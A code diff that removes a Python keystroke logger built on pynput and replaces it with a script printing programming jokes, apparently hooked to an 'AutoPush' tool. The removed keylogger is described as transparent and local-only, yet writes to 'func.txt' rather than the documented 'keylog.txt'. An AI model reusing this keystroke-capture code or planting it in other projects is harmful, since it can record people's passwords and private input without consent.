@@ -1,81 +1,42 @@
-"""
-keylogger.py - Transparent, educational keystroke logger for Windows.
-
-PURPOSE
-    Learn how to observe keyboard input in Python using the `pynput` library.
-    Logs YOUR OWN keystrokes on YOUR OWN machine to a local text file.
-    No hiding, no autostart/persistence, no network/exfiltration.
-
-ETHICS / LEGAL  (read this)
-    Only run this on a computer you own, to capture your own input. Recording
-    another person's keystrokes without their knowledge and consent is illegal
-    in most jurisdictions and a serious privacy violation. This script is
-    deliberately transparent (visible console, local file only) so it cannot
-    be used covertly.
-
-SETUP
-    1. Install Python from https://python.org (tick "Add to PATH").
-    2. pip install pynput
-    3. python keylogger.py
-
-STOP
-    Press ESC, or Ctrl+C in the console.
-
-OUTPUT
-    Appends to keylog.txt next to this script.
-"""
-
-import datetime
+#!/usr/bin/env python3
+# fun.py - chay kem moi lan AutoPush chay, cho vui :)
 import os
-import sys
+import random
+import datetime
 
-try:
-    from pynput import keyboard
-except ImportError:
-    sys.exit("pynput is not installed. Run:  pip install pynput")
+JOKES = [
+    "There are only 10 kinds of people: those who understand binary and those who don't.",
+    "A SQL query walks into a bar, goes up to two tables and asks: can I JOIN you?",
+    "Why do programmers prefer dark mode? Because light attracts bugs.",
+    "It works on my machine. -- every developer, ever.",
+    "Commit early, commit often. Push... let AutoPush handle that.",
+    "99 little bugs in the code, take one down, patch it around, 127 little bugs in the code.",
+    "To understand recursion, you must first understand recursion.",
+    "Debugging: being the detective in a crime movie where you are also the murderer.",
+    "There is no place like 127.0.0.1.",
+    "Real programmers count from 0.",
+]
 
-LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "func.txt")
+ART = r"""
+   _         _        ___         _
+  /_\ _  _ _| |_ ___ | _ \_  _ __| |_
+ / _ \ || |  _/ _ \| _/ || (_-< ' \
+/_/ \_\_,_|\__\___/|_|  \_,_/__/_||_|
+"""
 
 
-def write(text: str) -> None:
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(text)
+def main():
+    joke = random.choice(JOKES)
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print(ART)
+    print(f"[{now}] {joke}")
 
-
-def on_press(key) -> "bool | None":
+    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fun-log.txt")
     try:
-        # Printable character keys.
-        write(key.char)
-    except AttributeError:
-        # Special keys (space, enter, shift, etc.).
-        name = str(key).replace("Key.", "")
-        if key == keyboard.Key.space:
-            write(" ")
-        elif key == keyboard.Key.enter:
-            write("\n")
-        elif key == keyboard.Key.esc:
-            print("\nESC pressed - stopping.")
-            return False  # Stops the listener.
-        else:
-            write(f"[{name}]")
-
-
-def main() -> None:
-    print("=" * 60)
-    print("  TRANSPARENT KEYLOGGER (educational - local use only)")
-    print(f"  Logging YOUR keystrokes to: {LOG_FILE}")
-    print("  Press ESC (or Ctrl+C) to STOP.")
-    print("=" * 60)
-
-    write(f"\n----- Session started {datetime.datetime.now()} -----\n")
-    try:
-        with keyboard.Listener(on_press=on_press) as listener:
-            listener.join()
-    except KeyboardInterrupt:
+        with open(log_path, "a", encoding="utf-8") as f:
+            f.write(f"{now}  {joke}\n")
+    except OSError:
         pass
-    finally:
-        write(f"\n----- Session ended {datetime.datetime.now()} -----\n")
-        print(f"Stopped. Log saved to {LOG_FILE}")
 
 
 if __name__ == "__main__":
